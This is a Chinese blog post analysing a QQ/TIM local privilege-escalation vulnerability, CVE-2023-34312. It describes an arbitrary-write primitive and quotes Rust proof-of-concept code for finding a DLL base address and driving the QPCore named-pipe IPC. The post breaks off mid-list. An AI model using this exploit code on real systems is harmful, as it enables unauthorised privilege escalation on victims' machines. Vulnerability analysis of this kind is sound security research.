<!DOCTYPE html><html lang="zh"><head><meta charset="UTF-8"><meta name="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><title>Joe1sn's Cabinet | qq-evasion</title><meta name="description" content="&lt;p&gt;关于QQ提权漏洞CVE-2023-34312的分析&lt;/p&gt;"><link rel="icon" href="/images/favicon.png"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Source+Sans+Pro:400,700"><link rel="stylesheet" href="/css/highlights/darkula.css"><link rel="stylesheet" href="/css/main.css"><link rel="search" type="application/opensearchdescription+xml" href="https://joe1sn.eu.org/atom.xml" title="Joe1sn's Cabinet"><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="Joe1sn's Cabinet" type="application/atom+xml">
</head><body><div class="container"><header class="main-header"><h1 class="main-header__title uplize"><a class="main-header__title__link" href="/">Joe1sn's Cabinet</a></h1><nav class="main-header__nav"><ul class="main-nav"><li class="main-nav__list"><a class="main-nav__list__link" href="/" target="_self">HOME</a></li><li class="main-nav__list"><a class="main-nav__list__link" href="/archives/" target="_self">ARCHIVE</a></li><li class="main-nav__list"><a class="main-nav__list__link" href="https://github.com/Joe1sn" target="_blank">GITHUB</a></li></ul></nav></header><main class="container__wrapper"><article class="article post"><h3 class="article__title">qq-evasion</h3><div class="article__date metadata"><div class="post-info">2023/07/03</div></div><div class="article__tags metadata">Tags:
</div><div class="article__body"><p>关于QQ提权漏洞CVE-2023-34312的分析</p>
<span id="more"></span>
<h1 id="poc分析"><a class="markdownIt-Anchor" href="#poc分析"></a> PoC分析</h1>
<p>PoC地址：<a target="_blank" rel="noopener" href="https://github.com/vi3t1/qq-tim-elevation%EF%BC%8C%E7%94%A8rust%E5%86%99%E7%9A%84%E6%8C%89%E7%85%A7%E6%95%99%E7%A8%8B%E7%BC%96%E8%AF%91%E5%A5%BD%E4%BA%86%E5%B0%B1%E5%8F%AF%E4%BB%A5%E7%9B%B4%E6%8E%A5%E6%89%93%E4%BA%86">https://github.com/vi3t1/qq-tim-elevation，用rust写的按照教程编译好了就可以直接打了</a></p>
<p>由于没有开启ASLR保护所以很稳</p>
<p><img src="http://a1.qpic.cn/psc?/V104oQlN3XVuLi/bqQfVz5yrrGYSXMvKr.cqdYM8fb*1KiKtqJ7SRtL30k.xeCdcThzLK27Hn5JC3VblzMyGryvM7mjQClNs1omDVxy5AzmGCKEtQdIyKlU4q4!/b&amp;ek=1&amp;kp=1&amp;pt=0&amp;tl=1&amp;vuin=909094195&amp;tm=1688385600&amp;dis_t=1688386634&amp;dis_k=9881869615a286a72b004a697a55a9ac&amp;sce=50-1-1&amp;rf=viewer_311" alt="img" /></p>
<p><img src="D:%5CPictures%5Ctypora%5Cimage-20230703201740757.png" alt="image-20230703201740757" /></p>
<p>接着是分析一下PoC</p>
<h2 id="触发"><a class="markdownIt-Anchor" href="#触发"></a> 触发</h2>
<p>触发方式是<code>.\QQProtect .\evil.dll</code>，同时必须保持<code>tinyxml.dll</code>在同一目录下，这里用QQ9.7.7举例子。</p>
<p><img src="D:%5CPictures%5Ctypora%5Cimage-20230703202240244.png" alt="image-20230703202240244" /></p>
<p>首先是<a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/windows/win32/api/processenv/nf-processenv-getcommandlinew"><code>GetCommandLineW</code></a>获得启动参数，接着判断置否存在下列关键参数，然后不存在关键参数直接到了<code>StartAddress</code></p>
<p>使用<code>QQProtectEngine.dll</code>中的<code>RunQQProtect</code>，设置回调函数<code>sub_40C950</code></p>
<p><img src="D:%5CPictures%5Ctypora%5Cimage-20230703203114437.png" alt="image-20230703203114437" /></p>
<p>回调函数中的<code>a2</code>指针可以将任何地址的值设置为参数分析时的参数个数值，也就是 <strong>1</strong>。</p>
<p><img src="D:%5CPictures%5Ctypora%5Cimage-20230703203402262.png" alt="image-20230703203402262" /></p>
<p><img src="D:%5CPictures%5Ctypora%5Cimage-20230703211606183.png" alt="image-20230703211606183" /></p>
<p>那么现在我们就有了将任意地址写为1的能力，恰好<code>QQProtect.exe</code>没有开启<code>ASLR</code>保护，若开启的话下图应该存在<code>IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE </code></p>
<p><img src="D:%5CPictures%5Ctypora%5Cimage-20230703204248679.png" alt="image-20230703204248679" /></p>
<h2 id="poc"><a class="markdownIt-Anchor" href="#poc"></a> PoC</h2>
<p>和上文中结合起来，在<code>QQProtect</code>中导入了<code>tinyxml.dll</code>，所以可以修改这个dll的内容来执行攻击。</p>
<p><img src="D:%5CPictures%5Ctypora%5Cimage-20230704082005386.png" alt="image-20230704082005386" /></p>
<ul>
<li>
<p>PoC首先获取了<code>evil.dll</code>的路径，</p>
<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="variable">evil_dllpath</span>: <span class="type">String</span> = std::env::<span class="title function_ invoke__">args</span>().<span class="title function_ invoke__">nth</span>(<span class="number">1</span>).<span class="title function_ invoke__">unwrap</span>();</span><br><span class="line"><span class="keyword">let</span> <span class="variable">evil_dllpath</span>: std::path::PathBuf = std::path::Path::<span class="title function_ invoke__">new</span>(&amp;evil_dllpath).<span class="title function_ invoke__">canonicalize</span>().<span class="title function_ invoke__">unwrap</span>();</span><br><span class="line"><span class="built_in">println!</span>(<span class="string">&quot;evil dll: &#123;&#125;&quot;</span>, evil_dllpath.<span class="title function_ invoke__">display</span>());</span><br></pre></td></tr></table></figure>
<p>接着打开服务获得<code>QQProtectEngine.dll</code>的基地址（因为他开启了ASLR保护）。<br />
<img src="D:%5CPictures%5Ctypora%5Cimage-20230704082356731.png" alt="image-20230704082356731" /><br />
在PoC中打开了Windows的<code>QPCore</code>服务然后获取配置信息，从配置信息中提取出<code>qqprotect.exe</code>和<code>QQProtectEngine.dll</code>的路径。<br />
由于<code>LoadLibraryExW</code>中使用了<code>DONT_RESOLVE_DLL_REFERENCES</code>所以不会调用DLLMain，若函数成功，则返回值是已加载模块的句柄，从句柄的第一个值提取出加载的地址。注意的是，这里是首先加载<code>tinyxml.dll</code>，所以加载的<code>QQProtectEngine.dll</code>的地址在这里同一样适用，这样就获得了<code>QQProtectEngine.dll</code>的基地址。</p>
<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">fn</span> <span class="title function_">get_qqprotectengine_dllbase</span>() <span class="punctuation">-&gt;</span> <span class="type">u32</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">manager</span> = ServiceManager::<span class="title function_ invoke__">local_computer</span>(None::&lt;&amp;<span class="type">str</span>&gt;, ServiceManagerAccess::ENUMERATE_SERVICE).<span class="title function_ invoke__">unwrap</span>();</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">service</span> = manager.<span class="title function_ invoke__">open_service</span>(<span class="string">&quot;QPCore&quot;</span>, ServiceAccess::QUERY_CONFIG).<span class="title function_ invoke__">unwrap</span>();</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">service_config</span> = service.<span class="title function_ invoke__">query_config</span>().<span class="title function_ invoke__">unwrap</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> <span class="variable">qqprotect_exe</span> = windows_args::ArgsOs::<span class="title function_ invoke__">parse_cmd</span>(service_config.executable_path.<span class="title function_ invoke__">as_os_str</span>()).<span class="title function_ invoke__">next</span>().<span class="title function_ invoke__">unwrap</span>();</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">qqprotectengine_dll</span> = std::path::Path::<span class="title function_ invoke__">new</span>(&amp;qqprotect_exe).<span class="title function_ invoke__">parent</span>().<span class="title function_ invoke__">unwrap</span>().<span class="title function_ invoke__">join</span>(<span class="string">&quot;QQProtectEngine.dll&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsafe</span> &#123;</span><br><span class="line">        <span class="keyword">let</span> <span class="variable">h</span> = <span class="title function_ invoke__">LoadLibraryExW</span>(<span class="title function_ invoke__">PCWSTR</span>(HSTRING::<span class="title function_ invoke__">from</span>(qqprotectengine_dll.<span class="title function_ invoke__">as_path</span>()).<span class="title function_ invoke__">as_ptr</span>()), HANDLE::<span class="title function_ invoke__">default</span>(), DONT_RESOLVE_DLL_REFERENCES).<span class="title function_ invoke__">unwrap</span>();</span><br><span class="line">        <span class="keyword">let</span> <span class="variable">base</span> = h.<span class="number">0</span> <span class="keyword">as</span> <span class="type">u32</span>;</span><br><span class="line">        <span class="title function_ invoke__">FreeLibrary</span>(h);</span><br><span class="line">        <span class="keyword">return</span> base;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>创建IPC进程间通讯</p>
<p>首先创建了IPC通讯的管道描述符<code>\\.\pipe\_QPIPC_PUB1015_</code>，</p>
<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">fn</span> <span class="title function_">qpcore_pub_ipc</span>() <span class="punctuation">-&gt;</span> File &#123;</span><br><span class="line">    <span class="keyword">return</span> File::<span class="title function_ invoke__">options</span>()</span><br><span class="line">        .<span class="title function_ invoke__">read</span>(<span class="literal">true</span>).<span class="title function_ invoke__">write</span>(<span class="literal">true</span>)</span><br><span class="line">        .<span class="title function_ invoke__">open</span>(<span class="string">r&quot;\\.\pipe\_QPIPC_PUB1015_&quot;</span>).<span class="title function_ invoke__">unwrap</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">fn</span> <span class="title function_">qpcore_private_ipc</span>(pub_ipc: &amp;<span class="keyword">mut</span> File) <span class="punctuation">-&gt;</span> File &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">hdr</span> = <span class="string">b&quot;aaaaaaaallllaaaaaaaaaaaaaaaaaaaaaaaavvvvaaaaffffaaaaaaaaaaaaaaaassss&quot;</span>.<span class="title function_ invoke__">to_vec</span>();</span><br><span class="line">    hdr.<span class="title function_ invoke__">chunks_exact_mut</span>(<span class="number">4</span>).<span class="title function_ invoke__">for_each</span>(</span><br><span class="line">        |chunk| &#123;</span><br><span class="line">            <span class="keyword">match</span> chunk.<span class="title function_ invoke__">as_ref</span>() &#123;</span><br><span class="line">                <span class="string">b&quot;vvvv&quot;</span> =&gt; chunk.<span class="title function_ invoke__">copy_from_slice</span>(&amp;<span class="number">1_u32</span>.<span class="title function_ invoke__">to_le_bytes</span>()),</span><br><span class="line">                <span class="string">b&quot;ffff&quot;</span> =&gt; chunk.<span class="title function_ invoke__">copy_from_slice</span>(&amp;<span class="number">500_u32</span>.<span class="title function_ invoke__">to_le_bytes</span>()),</span><br><span class="line">                _ =&gt; ()</span><br><span class="line">            &#125;;</span><br><span class="line">        &#125;</span><br><span class="line">    );</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">body</span> = <span class="string">b&quot;aaaappppttttaaaaaaaa&quot;</span>.<span class="title function_ invoke__">to_vec</span>();</span><br><span class="line">    body.<span class="title function_ invoke__">chunks_exact_mut</span>(<span class="number">4</span>).<span class="title function_ invoke__">for_each</span>(</span><br><span class="line">        |chunk| &#123;</span><br><span class="line">            <span class="keyword">match</span> chunk.<span class="title function_ invoke__">as_ref</span>() &#123;</span><br><span class="line">                <span class="string">b&quot;pppp&quot;</span> =&gt; chunk.<span class="title function_ invoke__">copy_from_slice</span>(&amp;std::process::<span class="title function_ invoke__">id</span>().<span class="title function_ invoke__">to_le_bytes</span>()),</span><br><span class="line">                <span class="string">b&quot;tttt&quot;</span> =&gt; chunk.<span class="title function_ invoke__">copy_from_slice</span>(&amp;<span class="number">1_u32</span>.<span class="title function_ invoke__">to_le_bytes</span>()),</span><br><span class="line">                _ =&gt; ()</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> <span class="variable">llll</span> = (hdr.<span class="title function_ invoke__">len</span>() + body.<span class="title function_ invoke__">len</span>() + <span class="number">4</span>) <span class="keyword">as</span> <span class="type">u32</span>;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">ssss</span> = body.<span class="title function_ invoke__">len</span>() <span class="keyword">as</span> <span class="type">u32</span>;</span><br><span class="line"></span><br><span class="line">    hdr.<span class="title function_ invoke__">chunks_exact_mut</span>(<span class="number">4</span>).<span class="title function_ invoke__">for_each</span>(</span><br><span class="line">        |chunk| &#123;</span><br><span class="line">            <span class="keyword">match</span> chunk.<span class="title function_ invoke__">as_ref</span>() &#123;</span><br><span class="line">                <span class="string">b&quot;llll&quot;</span> =&gt; chunk.<span class="title function_ invoke__">copy_from_slice</span>(&amp;llll.<span class="title function_ invoke__">to_le_bytes</span>()),</span><br><span class="line">                <span class="string">b&quot;ssss&quot;</span> =&gt; chunk.<span class="title function_ invoke__">copy_from_slice</span>(&amp;ssss.<span class="title function_ invoke__">to_le_bytes</span>()),</span><br><span class="line">                _ =&gt; ()</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> <span class="variable">send</span> = [&amp;hdr[..], &amp;body[..], <span class="string">b&quot;tail&quot;</span>].<span class="title function_ invoke__">concat</span>();</span><br><span class="line">    pub_ipc.<span class="title function_ invoke__">write_all</span>(&amp;send).<span class="title function_ invoke__">unwrap</span>();</span><br><span class="line"></span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;qpcore_private_ipc():&quot;</span>);</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;sent 0x&#123;:x&#125; bytes&quot;</span>, send.<span class="title function_ invoke__">len</span>());</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;&#123;&#125;&quot;</span>, rhexdump::<span class="title function_ invoke__">hexdump</span>(&amp;send));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">recv</span> = <span class="built_in">vec!</span>[<span class="number">0_u8</span>; <span class="number">4096</span>];</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">recv_len</span> = pub_ipc.<span class="title function_ invoke__">read</span>(&amp;<span class="keyword">mut</span> recv).<span class="title function_ invoke__">unwrap</span>();</span><br><span class="line"></span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;recv 0x&#123;:x&#125; bytes&quot;</span>, recv_len);</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;&#123;&#125;&quot;</span>, rhexdump::<span class="title function_ invoke__">hexdump</span>(&amp;recv[<span class="number">0</span>..recv_len]));</span><br><span class="line">    <span class="built_in">println!</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> File::<span class="title function_ invoke__">options</span>()</span><br><span class="line">        .<span class="title function_ invoke__">read</span>(<span class="literal">true</span>).<span class="title function_ invoke__">write</span>(<span class="literal">true</span>)</span><br><span class="line">        .<span class="title function_ invoke__">open</span>(<span class="built_in">format!</span>(<span class="string">r&quot;\\.\pipe\QPIPC_&#123;&#125;&quot;</span>, std::process::<span class="title function_ invoke__">id</span>())).<span class="title function_ invoke__">unwrap</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li></li>
</ul>
</div></article><section class="comments"><div id="disqus_thread"></div><script>var disqus_shortname = 'disqus';
(function () {
  var dsq = document.createElement('script');
  dsq.type = 'text/javascript';
  dsq.async = true;
  dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
  (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
})();</script><script id="dsq-count-scr" src="//#{theme.disqus}.disqus.com/count.js" async></script></section><div class="pagination"><a class="pagination__link pagination__prev" href="/2023/07/08/win-pwn-stack/">prev_post</a><a class="pagination__link pagination__next" href="/2023/06/26/googleCTF-wp/">next_post</a></div></main><footer class="footer metadata"><p class="footer__text">© 2023 Joe1sn</p><p class="footer__text">Powered by <a class="footer__text__link" href="https://hexo.io/" target="_blank">Hexo</a> &amp; <a class="footer__text__link" href="https://pages.github.com/" target="_blank">Github Page</a></p></footer></div></body></html>